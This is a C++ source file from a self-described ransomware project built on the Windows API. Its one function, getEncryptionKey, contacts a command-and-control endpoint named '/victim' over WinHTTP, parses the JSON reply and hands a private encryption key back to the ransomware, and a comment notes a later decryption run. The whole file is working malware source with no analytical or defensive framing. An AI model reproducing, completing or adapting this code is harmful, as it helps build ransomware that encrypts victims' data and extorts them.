/*
   ############################################
   # Copyright 2023 Panagiotis (MalwarePad)   #
   # WinAPI only ransomware made from scratch #
   ############################################
*/

#include "GetEncryptionKey.h"

// boilerplate to just do an http request, jesus christ
int getEncryptionKey(std::string* out) {
	HINTERNET hSession = WinHttpOpen(L"I'm going feral agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession) {
		MessageBox(NULL, L"WinHttpOpen failed!", NULL, NULL);
		return 0;
	}

	HINTERNET hConnect = WinHttpConnect(hSession, L"localhost", INTERNET_DEFAULT_HTTP_PORT, 0); // INTERNET_DEFAULT_HTTPS_PORT
	if (!hConnect) {
		MessageBox(NULL, L"WinHttpConnect failed!", NULL, NULL);
		WinHttpCloseHandle(hSession);
		return 0;
	}

	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/victim", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL); // WINHTTP_FLAG_SECURE
	if (!hRequest) {
		MessageBox(NULL, L"WinHttpOpenRequest failed!", NULL, NULL);
		return 0;
	}

	LPCWSTR headers = L"Content-Type: application/json\r\n";
	if (!WinHttpAddRequestHeaders(hRequest, headers, wcslen(headers), WINHTTP_ADDREQ_FLAG_ADD)) {
		MessageBox(NULL, L"WinHttpAddRequestHeaders failed!", NULL, NULL);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return 0;
	}

	LPCWSTR jsonData = L"{}";

	if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)jsonData, wcslen(jsonData), wcslen(jsonData), 0)) {
		MessageBox(NULL, L"WinHttpSendRequest failed!", NULL, NULL);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return 0;
	}

	if (!WinHttpReceiveResponse(hRequest, NULL)) {
		MessageBox(NULL, L"WinHttpReceiveResponse failed!", NULL, NULL);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return 0;
	}

	std::string response;
	DWORD bytesRead;
	do {
		char buffer[1024];
		if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
			MessageBox(NULL, L"WinHttpReadData failed!", NULL, NULL);
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			WinHttpCloseHandle(hSession);
			return 0;
		}
		if (bytesRead > 0) {
			response.append(buffer, bytesRead);
		}
	} while (bytesRead > 0);

	std::map<std::string, std::string> parsedData = parseJson(response);

	const std::string success = parsedData["success"];
	if (strcmp(success.c_str(), "true") != 0) { // second execution (decryption)
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return 0;
	}

	std::string privateKeyRaw = parsedData["privateKey"];

	*out = privateKeyRaw;

	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);

	return 1;
}